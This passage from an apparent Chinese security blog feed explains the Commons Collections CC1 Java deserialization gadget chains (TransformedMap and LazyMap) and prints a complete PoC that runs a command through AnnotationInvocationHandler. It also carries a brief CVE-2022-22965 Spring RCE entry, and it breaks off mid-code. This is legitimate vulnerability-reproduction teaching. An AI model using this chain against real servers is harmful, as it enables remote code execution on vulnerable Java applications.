        <content type="html"><![CDATA[<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>CVE-2022-22965：Spring Framework远程代码执行漏洞</p><h2 id="漏洞编号："><a href="#漏洞编号：" class="headerlink" title="漏洞编号："></a>漏洞编号：</h2><p><strong>CVE-2022-22965</strong></p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java 企业级应用的开发难度和开发周期,2022年3月31日，VMware Tanzu发布漏洞报告，Spring Framework存在远程代码执行漏洞，在 JDK 9+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定的远程代码执行 (RCE) 的攻击。</p><h2 id="漏洞影响范围："><a href="#漏洞影响范围：" class="headerlink" title="漏洞影响范围："></a>漏洞影响范围：</h2><ul><li>Spring Framework &lt; 5.3.18</li><li>Spring Framework &lt; 5.2.20</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections反序列化链</title>
      <link href="/2023/03/19/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
      <url>/2023/03/19/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons Collections"></a>Commons Collections</h1><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons Collections包和简介 | 闪烁之狐 (blinkfox.github.io)</a></p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p><p><a href="http://commons.apache.org/proper/commons-collections/">Commons Collections</a>包为Java标准的<code>Collections API</code>提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p><h2 id="Collections的包结构和简单介绍"><a href="#Collections的包结构和简单介绍" class="headerlink" title="Collections的包结构和简单介绍"></a>Collections的包结构和简单介绍</h2><ul><li><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</li><li><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</li><li><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</li><li><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</li><li><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</li><li><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</li><li><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</li><li><code>org.apache.commons.collections.iterators</code> – 实现java.util.Iterator接口的一组类</li><li><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键/值映射相关的一组类</li><li><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</li><li><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</li><li><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</li></ul><pre class="language-none"><code class="language-none">* *********** 常用类  ************ 1. org.apache.commons.collections4.CollectionUtils*      isEmpty 判断集合是否为空*      isNotEmpty 判断集合不为空*      isEqualCollection 比较两集合值是否相等, 不考虑元素的顺序*      union 并集, 不会去除重复元素*      intersection 交集*      disjunction 交集的补集*      subtract 差集, 不去重*      unmodifiableCollection 得到一个集合镜像，不允许修改，否则报错*      containsAny 判断两个集合是否有相同元素*      getCardinalityMap 统计集合中各元素出现的次数，并以Map&lt;Object, Integer&gt;输出*      isSubCollection a是否 b 的子集合, a集合大小 &lt;&#x3D; b集合大小*      isProperSubCollection a是否 b 的子集合, a集合大小 &lt; b集合大小*      cardinality 某元素在集合中出现的次数*      find 返回集合中满足函数式的唯一元素，只返回最先处理符合条件的唯一元素, 以废弃*      filter 过滤集合中满足函数式的所有元素*      transform 转换新的集合，对集合中元素进行操作，如每个元素都累加1*      countMatches 返回集合中满足函数式的数量*      select 将满足表达式的元素存入新集合中并返回新集合元素对象*      selectRejected 将不满足表达式的元素存入新集合中并返回新集合元素对象*      collect  collect底层调用的transform方法, 将所有元素进行处理，并返回新的集合*      addAll  将一个数组或集合中的元素全部添加到另一个集合中*      get 返回集合中指定下标元素*      isFull 判断集合是否为空*      maxSize 返回集合最大空间*      predicatedCollection 只要集合中元素不满足表达式就抛出异常*      removeAll 删除集合的子集合*      synchronizedCollection 同步集合** 2. org.apache.commons.collections4.MapUtils*      isEmpty 判断Map是否为空*      isNotEmpty 判断Map是否不为空*      getBoolean 从Map中获取 Boolean, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getBooleanValue 从Map中获取 boolean, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getDouble 从Map中获取 Double, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getDoubleValue 从Map中获取 double, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getFloat 从Map中获取 Float, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getFloatValue 从Map中获取 float, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getInteger 从Map中获取 Integer, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getIntegerValue 从Map中获取 int, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getLong 从Map中获取 Long, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getLongValue 从Map中获取 long, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getString 从Map中获取 String, 其重载方法有三个参数, 表示如果转换失败则使用默认值*      getMap 获取Map类型的值*      putAll 将二维数组放入Map中**&#x2F;</code></pre><h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>关于cc1的反序列化，网上一般有两条链子，一个就是ysoserial中的lazymap链，还有transformedmap链</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">JDK8u65</a>（高版本jdk中AnnotationinvocationHandler的readObject被重写了</li><li>[openJDK 8u65](<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">jdk8u/jdk8u/jdk: af660750b2f4 (openjdk.org)</a>) (25年更新:网站维护了)</li><li>Maven</li></ul><p>后面的具体配置可以看<a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=053f03b424a45370bc5813843ae5268f">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a>和<a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#toc-heading-2">Java反序列化Commons-Collections篇01-CC1链 | 芜风 (drun1baby.top)</a></p><p>maven内容</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h2 id="执行类分析"><a href="#执行类分析" class="headerlink" title="执行类分析"></a>执行类分析</h2><p>我们要先了解一下在cc1里实现了Transformer接口的几个方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319190319370.png" alt="image-20230319190319370"></p><p><strong>ChainedTransformer</strong>：输入对象将传递给第一个转换器。转换后的结果将传递给第二个转换器，依此类推。类似递归的操作，每次转换的输出结果将作为下一次转换的输入。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320091529005.png" alt="image-20230320091529005"></p><p><strong>InvokerTransformer</strong>：通过反射创建新的对象实例的转换器实现。InvokerTransformer 是 Apache Commons Collections 库中的一个类，它可以通过反射机制调用指定对象的指定方法，并返回方法执行结果。它是一个转换器（Transformer）实现，用于将输入对象转换为调用指定方法后的返回值。</p><p>InvokeTransformer重写的transform函数是cc1链的关键点</p><p><strong>ConstantTransformer</strong> ：它是一个转换器（Transformer）实现，用于将输入对象转换为一个固定的常量值。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320091719221.png" alt="image-20230320091719221"></p><p>这里我们先重点说一下InvokerTransformer</p><p>InvokerTransformer的有参构造需要三个参数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319191555790.png" alt="image-20230319191555790"></p><p>这三个参数在transform方法里都有用到，从这里我们能分别看出这三个函数的作用。methodName是需要获取的方法名，paramTypes是这个方法的参数类型，args参数则是它的参数列表。同时input也是transform的形参，也就是说是，我们可以利用InvokerTransformer.transform以反射的方式去调用一些其他的方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319191708721.png" alt="image-20230319191708721"></p><p>然后我们试着去调用Runtime</p><p>首先正常使用是</p><pre class="language-java" data-language="java"><code class="language-java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><p>通过反射则是</p><pre class="language-java" data-language="java"><code class="language-java">Runtime runtime &#x3D; Runtime.getRuntime();&#x2F;&#x2F;获得类对象Class r &#x3D; Runtime.class;&#x2F;&#x2F;获得exec方法Method exec &#x3D; r.getMethod(&quot;exec&quot;, String.class);&#x2F;&#x2F;执行calc命令exec.invoke(runtime,&quot;calc&quot;);</code></pre><p>利用InvokerTransformer.transform执行命令</p><pre class="language-java" data-language="java"><code class="language-java">Runtime runtime &#x3D; Runtime.getRuntime();new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319193947552.png" alt="image-20230319193947552"></p><p>那么假设我们在序列化中传入了InvokerTransformer类，如果在反序列化的过程中，有能够触发transform的地方，不就可以实现命令执行了吗？</p><p>现在我们已经找完反序列化中的执行类了，接下来就需要去找有没有哪里调用了transform</p><p>这里能够利用的地方一共有两处，分别是LazyMap和TransformedMap，这也造成了cc1的两条链</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319194549513.png" alt="image-20230319194549513"></p><h2 id="TransformedMap链"><a href="#TransformedMap链" class="headerlink" title="TransformedMap链"></a>TransformedMap链</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F;transformValue方法protected Object transformValue(Object object) &#123;    if (valueTransformer &#x3D;&#x3D; null) &#123;        return object;    &#125;    return valueTransformer.transform(object);&#125;</code></pre><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F;checkSetValue方法protected Object checkSetValue(Object value) &#123;    return valueTransformer.transform(value);&#125;</code></pre><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F;transformKey方法protected Object transformKey(Object object) &#123;    if (keyTransformer &#x3D;&#x3D; null) &#123;        return object;    &#125;    return keyTransformer.transform(object);&#125;</code></pre><p>这三处调用transform的方法其实根本上都差不多，都是调用keyTransformer或valueTransformer的transform方法，而keyTransformer和valueTransformer在构造函数中都进行了赋值</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319195321514.png" alt="image-20230319195321514"></p><p><strong>TransformedMap</strong>：TransformedMap 是 Apache Commons Collections 框架中的一个类，它实现了一个 Map 接口，可以对其所包含的键值对进行转换操作。可以在原有的 Map 对象的基础上，提供一种能够对键或值进行自定义转换的方式。具体来说，TransformedMap 实例将会对 get、put 和 containsKey 方法进行重载，从而在访问 Map 中的键值对时，通过指定的转换器来对键或值进行转换操作。</p><p>这个构造方法是protected类型的，所以类中肯定还有其他方法调用了这个构造方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319201341859.png" alt="image-20230319201341859"></p><p>decorate这个静态方法我们可以很方便的调用，接下来只要找到有调用checkSetValue、transformValue、transformKey三个方法其中之一的我们可以利用的函数就也可以执行命令了。</p><p>满足这个条件的其实在TransformedMap 下就有一个</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319201716424.png" alt="image-20230319201716424"></p><p>调用了transformValue和transformKey，利用这个我们可以再写出一种在不直接调用InvokerTransformer.transform方法的命令执行路径</p><pre class="language-java" data-language="java"><code class="language-java">Runtime runtime &#x3D; Runtime.getRuntime();InvokerTransformer exec &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);HashMap map &#x3D; new HashMap();&#x2F;&#x2F;可以触发两次&#x2F;&#x2F;将keyTransformer和valueTransformer都成为exec，实际上put之后就会变成transform(exec)Map decorate &#x3D; TransformedMap.decorate(map, exec, exec);Object calc &#x3D; decorate.put(runtime, runtime);</code></pre><p>如果我们能再找到调用了put方法的函数，可能也能找到一条反序列化的利用链。</p><p>不过这和我们的TransformedMap 链没有关系，我们要利用的是第三个函数checkSetValue，</p><p>在AbstractInputCheckedMapDecorator抽象类中的一个静态类MapEntry中的setValue方法中就调用了checkSetValue方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319202421645.png" alt="image-20230319202421645"></p><p>那接下来我们就需要去找哪里能够触发AbstractInputCheckedMapDecorator.MapEntry.setValue()</p><p>MapEntry是AbstractMapEntryDecorator的子类，而AbstractMapEntryDecorator又实现了Map.Entry接口，可以看出MapEntry中的setValue方法其实就是Entry中的setValue方法的重写</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320092545105.png" alt="image-20230320092545105"></p><p>当 TransformedMap执行transformedMap.entrySet()得到的entry[]数组元素都是AbstractInputCheckedMapDecorator类的对象,</p><p>可以通过执行以下代码,在entry.setValue打断点确认entry的类型</p><pre class="language-java" data-language="java"><code class="language-java">public class test &#123;    public static void main(String[] args) &#123;        Runtime runtime &#x3D; Runtime.getRuntime();        HashMap&lt;Object, Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;set_key&quot;, &quot;set_value&quot;);        Transformer invokerTransformer &#x3D;new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);;        Map&lt;Object, Object&gt; transformedMap &#x3D; TransformedMap.decorate(map, null, invokerTransformer);        for (Map.Entry entry : transformedMap.entrySet()) &#123;            entry.setValue(runtime);        &#125;    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319205617940.png" alt="image-20230319205617940"></p><p>这里entry是AbstractInputCheckedMapDecorator类型的，所以这里的<code>setValue()</code><strong>实际上就是在 Map 中对一组 entry（键值对）</strong>进行<code>setValue()</code>操作。</p><p>所以触发AbstractInputCheckedMapDecorator.MapEntry.setValue()的方式我们也清楚了，<strong>对Map进行遍历并调用setValue就可以了</strong></p><p>而在AnnotationinvocationHandler的readObject方法中，恰好有这样一个既遍历了Map，又对Map.Entry调用了setValue方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319211536405.png" alt="image-20230319211536405"></p><p>我们再看一下AnnotationinvocationHandler</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319214819709.png" alt="image-20230319214819709"></p><p>在构造方法中需要两个参数，一个是继承了Annotation的类对象，另一个是Map类型的值，这个map就是我们调用TransformedMap.decorate后返回的数值。</p><p>而且由于这个类不是public类型的，所以需要利用反射去实例化</p><p>到这里我们的整个利用链就已经可以整理出来了</p><p>入口类是AnnotationinvocationHandler</p><p>执行类是InvokerTransformer </p><p>AnnotationinvocationHandler -&gt; readObject</p><p>AbstractInputCheckedMapDecorator.MapEntry -&gt; setValue</p><p>TransformedMap -&gt; checkSetValue</p><p>InvokerTransformer -&gt; transform</p><h3 id="完善"><a href="#完善" class="headerlink" title="完善"></a>完善</h3><p>我们找到了入口类，利用链，执行类，看起来已经完美了，但是仍存在一些问题需要我们去解决</p><p>首先，Runtime对象是我们自己生成的，不能进行序列化</p><p>其次，AnnotationinvocationHandler 的readObject函数中还有两个if判断需要我们去解决</p><p>最后，setValue中的内容应该是我们要调用的对象，而不是</p><pre class="language-none"><code class="language-none">new AnnotationTypeMismatchExceptionProxy(    value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(        annotationType.members().get(name))</code></pre><h4 id="一、Runtime不能进行序列化"><a href="#一、Runtime不能进行序列化" class="headerlink" title="一、Runtime不能进行序列化"></a>一、Runtime不能进行序列化</h4><p>如果Runtime不能序列化，那么我们想要执行的命令也就无法进行序列化，不能通过反序列化达到命令执行的目的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320110929217.png" alt="image-20230320110929217"></p><p>但是，虽然Runtime不能进行序列化，可Runtime.class可以</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319220849369.png" alt="image-20230319220849369"></p><p>所以我们同样可以利用反射和InvokerTransformer.transform方法达到能够将我们想要执行的命令进行序列化的目的</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F;        Class&lt;Runtime&gt; rc &#x3D; Runtime.class;&#x2F;&#x2F;        Method getRuntime &#x3D; rc.getMethod(&quot;getRuntime&quot;);        Method getMethod &#x3D; (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);&#x2F;&#x2F;        Runtime runtime &#x3D; (Runtime)getRuntime.invoke(null);&#x2F;&#x2F;getRuntime是静态方法，所以invoke的第一个参数可以写null        Runtime runtime &#x3D; (Runtime)new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethod);&#x2F;&#x2F;        runtime.exec(&quot;calc&quot;)        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</code></pre><p>这里可以看到其实我们真正需要输入的只有Runtime.class，剩下的都是前一个的输出，所以这里我们可以借助之前提的ChainedTransformer进行简化</p><pre class="language-java" data-language="java"><code class="language-java">Transformer[] t &#x3D; new Transformer[]&#123;        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),&#x2F;&#x2F;获得getMethod方法        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),&#x2F;&#x2F;相当于getRuntime.invoke(null)，产生一个实例化的Runtime类型对象r        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;&#x2F;&#x2F;执行r.exec(&quot;calc&quot;)&#x2F;&#x2F;在InvokeTransformer中相当于&#x2F;&#x2F;Method method &#x3D; r.getClass().getMethod(exec, String.class);&#x2F;&#x2F;return method.invoke(r, calc);ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);chainedTransformer.transform(Runtime.class);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319224440542.png" alt="image-20230319224440542"></p><h4 id="二、绕过readObject函数中的两个if判断"><a href="#二、绕过readObject函数中的两个if判断" class="headerlink" title="二、绕过readObject函数中的两个if判断"></a>二、绕过readObject函数中的两个if判断</h4><p>首先我们创建的hashmap里需要有值，不然memberValues为0，for循环也不会进入</p><p>第一个if判断，获取的是我们传入的注解的类里的成员方法，同时Hashmap里的key要和成员方法的名一样</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319225346525.png" alt="image-20230319225346525"></p><p>但是Override里并没有成员变量</p><pre class="language-none"><code class="language-none">public @interface Override &#123;&#125;</code></pre><p>所以我们需要换一个，例如Target</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319225537236.png" alt="image-20230319225537236"></p><p>这时候就能满足第一个if判断了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319225619950.png" alt="image-20230319225619950"></p><p>而第二个判断是否存在的也肯定满足，因此这个问题也解决了</p><h4 id="三、setValue中的内容应该是我们要调用的对象"><a href="#三、setValue中的内容应该是我们要调用的对象" class="headerlink" title="三、setValue中的内容应该是我们要调用的对象"></a>三、setValue中的内容应该是我们要调用的对象</h4><p>我们已经知道如果想达到命令执行的目的，必须有这样一个调用方式</p><p>chainedTransformer.transform(Runtime.class);</p><p>但是现在我们调试时可以看到</p><p>setValue里的参数是</p><pre class="language-none"><code class="language-none">new AnnotationTypeMismatchExceptionProxy(    value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(        annotationType.members().get(name))</code></pre><p>这时valueTransformers已经是是我们构造的ChainedTransformer，但value参数并不是我们想要的 Runtime.class</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319230640546.png" alt="image-20230319230640546"></p><p>因此这里还需要借助ConstantTransformer，它能将输入对象转换为一个固定的常量值</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319230210283.png" alt="image-20230319230210283"></p><p>也就是假设我们将Transformer数组的第一位加上new ConstantTransformer(Runtime.class)，也就相当于我们给ConstantTransformer返回的iConstant值设置为了Runtime.class</p><p>那么在执行到TransformedMap里的checkSetValue时，第一次的chainedTransformer.transform调用的是ConstantTransformer的transform，返回的内容是固定的Runtime.class，实质上就是相当于将第二次调用transform的value赋值成了Runtime.class，满足了我们想要的chainedTransformer.transform(Runtime.class)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319231640825.png" alt="image-20230319231640825"></p><p>完整的poc为</p><pre class="language-java" data-language="java"><code class="language-java">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class Main &#123;    public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException &#123;        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        &#x2F;&#x2F; InvokerTransformer exec &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);        HashMap map &#x3D; new HashMap();        map.put(&quot;value&quot;,&quot;value&quot;);        Map decorate &#x3D; TransformedMap.decorate(map, null, chainedTransformer);&#x2F;&#x2F;        &#x2F;&#x2F;创建AnnotationinvocationHandler的类对象        Class&lt;?&gt; AIH_construct &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        &#x2F;&#x2F;获取构造方法        Constructor&lt;?&gt; declaredConstructor &#x3D; AIH_construct.getDeclaredConstructor(Class.class, Map.class);        declaredConstructor.setAccessible(true);        Object o &#x3D; declaredConstructor.newInstance(Target.class, decorate);        ser(o);        unser();    &#125;    public static void ser(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));        oos.writeObject(obj);    &#125;    public static void unser() throws IOException, ClassNotFoundException &#123;        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        oi.readObject();    &#125;&#125;</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>入口类是AnnotationinvocationHandler</p><p>执行类是InvokerTransformer </p><p>利用链是</p><p>AnnotationinvocationHandler.readObject</p><p>AbstractInputCheckedMapDecorator.MapEntry.setValue</p><p>TransformedMap.checkSetValue</p><p>InvokerTransformer.transform</p><p>使用到的工具类辅助利用链： </p><p>ConstantTransformer</p><p> ChainedTransformer</p><p> HashMap</p><h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><p>刚才我们分析完了TransformedMap链，接下来再来看LazyMap</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>LazyMap类中的get方法调用了transform方法</p><pre class="language-java" data-language="java"><code class="language-java">public Object get(Object key) &#123;    &#x2F;&#x2F; create value for key if key is not currently in the map    if (map.containsKey(key) &#x3D;&#x3D; false) &#123;        Object value &#x3D; factory.transform(key);        map.put(key, value);        return value;    &#125;    return map.get(key);&#125;</code></pre><p>map中的containKey(key)方法是判断Map 集合对象中是否包含指定的键名。如果存在则返回true,反之,返回false</p><p>如果我们能让factory是InvokerTransformer 类，并且key为Runtime.class的话，也同样能完成命令执行的目的</p><p>先看一下factory的赋值过程</p><p>通过静态的decorate调用protected类型的构造方法</p><pre class="language-none"><code class="language-none">public static Map decorate(Map map, Transformer factory) &#123;    return new LazyMap(map, factory);&#125;</code></pre><p>这里两个参数和Transformed一样，所以要传的东西也一样，这里可以试着触发一下</p><pre class="language-java" data-language="java"><code class="language-java">        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();        Transformer[] t &#x3D; new Transformer[]&#123;&#x2F;&#x2F;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer);        decorate.get(Runtime.class);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320155927956.png" alt="image-20230320155927956"></p><p>上面我们是手动调用的get方法，但是实际上并不会有给我们手动调用get方法的机会，因此我们就要找一个能触发get的方法了</p><p>还是我们熟悉的AnnotationInvocationHandler类，里面的invoke方法正好调用了get</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320160634867.png" alt="image-20230320160634867"></p><p>而memberValues属性的值也是在构造方法里进行的赋值，是可控的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320160754287.png" alt="image-20230320160754287"></p><p>那要再考虑如何调用invoke</p><p>还记得我们提到过的动态代理吗？</p><p>要实现动态代理需要有一个实现了InvocationHandler接口的对象，而这个AnnotationInvocationHandler中恰好实现了InvocationHandler接口，动态代理会自动调用实现了InvocationHandler接口的对象中的invoke方法，于是我们可以使用动态代理的方法来调用invoke方法</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; 因为AnnotationInvocationHandler不是public的，所以需要通过反射去实例化Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class);declaredConstructor.setAccessible(true);&#x2F;&#x2F;decorate 